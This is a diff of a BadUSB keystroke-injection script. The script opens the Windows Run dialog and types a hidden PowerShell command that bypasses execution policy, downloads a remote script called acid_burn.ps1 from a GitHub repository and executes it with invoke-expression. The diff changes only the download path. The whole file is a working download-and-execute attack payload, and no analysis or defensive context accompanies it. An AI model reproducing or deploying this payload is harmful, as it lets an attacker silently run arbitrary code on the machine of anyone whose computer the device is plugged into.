@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Finalet/BadUSB-Scripts/main/acid_burn.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Finalet/BadUSB-Scripts/main/PS1s/acid_burn.ps1?dl=1; invoke-expression $pl
 ENTER
